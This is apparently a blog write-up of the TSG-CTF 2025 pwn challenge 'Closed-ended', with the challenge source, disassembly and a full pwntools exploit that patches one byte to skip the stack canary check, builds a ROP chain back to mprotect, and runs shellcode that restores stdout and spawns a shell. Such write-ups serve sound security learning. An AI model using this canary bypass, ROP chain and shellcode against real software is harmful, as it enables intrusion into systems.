---
title: "[TSG-CTF 2025]-Pwn/Closed-ended"
published: 2025-01-22
description: "Canary check bypass then mprotect and profit with rop chain."
tags: ["pwn", "gdb"]
---

### Overview

This is the writeup of one of the interesting challenge i solved during TSG-CTF.

### Challenge

The source code of the challenge is already given(many many thanks for this!!).


```c
#include <unistd.h>
#include <sys/mman.h>
#include <stdio.h>

int main() {
    void* addr;
    char buf[10];

    mprotect((void*)0x401000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);

    if (close(1) != 0 || scanf("%p", &addr) != 1)
        return 0;

    if ((unsigned long)addr < 0x4010a7 || (unsigned long)addr > 0x402000) 
        return 0;

    if (scanf("%*c%c", (char*)addr) != 1)
        return 0;

    mprotect((void*)0x401000, 0x1000, PROT_READ | PROT_EXEC);

    scanf("%100s", buf);
    return 0;
}
```
By looking at source code,we can see it calls `mprotect` and make the ```section of elf``` where `instruction code` is stored which is normally `rx`, to `rwx`.Then it closes `stdout` and takes one ```address from user```and performs some `bound check` on that address.And then allow the user to write `one byte` at that `address`.
After that it calls `mprotect` and remove the `write` permission and takes 100 byte input in 10 byte buffer.
So we get plain old powerful `buffer overflow`.

If we look at the mitigations in binary,Canary is enabled

```markdown
gef> checksec
Canary                                  : Enabled
NX                                      : Enabled
PIE                                     : Disabled (0x400000)
RELRO                                   : Full RELRO
Fortify                                 : Not found
```
We have to somehow ```disable``` canary check so  we can use buffer overflow to control the ```RIP``` instructions.Also PIE is disabled so we know all the 
elf address and RELRO is enabled.

### Exploit

We can disable canary check by changing one byte in opcode.
If we see the assembly where canary check is performed
```asm
   0x0000000000401115 <+165>:	jmp    0x4010a7 <main+55>
   0x0000000000401117 <+167>:	call   0x401030 <__stack_chk_fail@plt>
```
and at  ```main+55```
```asm
   0x00000000004010a5 <+53>:	je     0x4010ba <main+74>
   0x00000000004010a7 <+55>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004010ab <+59>:	sub    rax,QWORD PTR fs:0x28
   0x00000000004010b4 <+68>:	jne    0x401117 <main+167>
```
After seeing the opcode at ```0x401115``` and ```0x4010a5```:
```asm
gef> x/10gx 0x0000000000401115
0x401115 <main+165>:	0x0fffffff14e890eb	0x31fa1e0ff300401f
gef> x/10gx 0x00000000004010a5
0x4010a5 <main+53>:	0x4864f8458b481374	0x750000002825042b
```
My first idea was to change the ```jne``` instruction to ```je``` at ```main+68``` but i hit the deadend later in exploit.(The deadend was due to```clobbered canary```).So my next idea was to change the offset at ```0x401115``` so that instead of jumping to ```main+55``` it jumps to ```main+70```,skipping the canary check entirely and we can get one time control of ```RIP```.

Now the ```problem``` is that there is no way to get ```libc leak``` so we have to resort to ```shellcode``` but in last ```mprotect``` call,the write permission is gone.
So my next ```goal``` was to call ```mprotect``` again with write permisions i.e. ```rsi = 0x7```
and make the region executable again.
After that it's ```ROP``` shenanigans.

```python
from pwn import *
elf = context.binary =  ELF("./closed_ended")
context.log_level = "debug"

io = process()
# io = remote("34.84.25.24", 50037)
gs = '''
b *main+124
b *main+46
b *main+0x49
'''
gdb.attach(io,gdbscript=gs)
canary_address = 0x401116
# one_byte = b"\x74"
one_byte = 0x9f

io.sendline(str(hex(canary_address)))
io.send(pack(one_byte))
shellcode_address = 0x401660+0x12
ret = 0x000000000040101a
rbp =shellcode_address+0x0
ret_address = 0x401070

#return to main->call mprotect->close(1) crashes->one more time RIP control
rop_payload_to_main = b"\x90"*11+pack(rbp)+pack(ret_address)+pack(ret)+pack(0x401105)+pack(0xcafebabe)
io.sendline(rop_payload_to_main)
#to fix close(1)
manual_shellcode = '''
    /* dup2(0, 1) */
    push 33
    pop rax
    xor rdi, rdi
    push 1
    pop rsi
    syscall

    add rsp,14 /*to allign stack */
'''

stack_assembly = asm(manual_shellcode)

rop_payload =pack(shellcode_address+0x40)+b"\x90"*0x2+pack(0xcafebabe)+pack(0xcafebabe)+pack(0x000000401682)+stack_assembly+asm(shellcraft.sh())
print(len(rop_payload))
io.sendline(rop_payload)
io.interactive()
```






